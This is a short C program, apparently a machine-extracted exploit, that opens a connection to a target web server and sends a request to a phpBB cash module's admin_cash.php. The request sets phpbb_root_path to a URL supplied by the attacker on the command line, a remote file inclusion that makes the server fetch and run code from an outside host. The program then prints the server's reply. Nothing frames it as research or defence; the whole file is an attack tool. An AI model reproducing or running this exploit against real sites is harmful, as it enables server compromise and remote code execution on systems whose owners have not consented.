
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;


 int AF_INET ;
 int SOCK_STREAM ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int ) ;
 struct hostent* gethostbyname (char*) ;
 int help (char*) ;
 int htons (int) ;
 scalar_t__ malloc (int) ;
 int memset (int *,char,int) ;
 int printf (char*,char*) ;
 int recv (int,char*,int,int ) ;
 int send (int,char*,int ,int ) ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,char*,char*,char*) ;
 int strlen (char*) ;

int main(int argc, char *argv[]) {

        struct sockaddr_in trg;
        struct hostent *he;

        int sockfd, buff;
 char buffer[1024];
 char *request;

 if(argc != 4 ) {
  help(argv[0]);
  exit(0);
 }

        he = gethostbyname(argv[1]);
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
 request = (char *) malloc(1024);

        trg.sin_family = AF_INET;
        trg.sin_port = htons(80);
        trg.sin_addr = *((struct in_addr *) he->h_addr);
        memset(&(trg.sin_zero), '\0', 8);

 connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr));
 sprintf(request,"GET http://%s/%s/admin/admin_cash.php?setmodules=1&phpbb_root_path=http://%s?cmd=w\n",argv[1],argv[2],argv[3]);
 send(sockfd,request,strlen(request),0);
 buff=recv(sockfd, buffer, 1024-1, 0);
 buffer[buff] = '\0';
 printf("%s",buffer);
 close(sockfd);
 return 0;

}
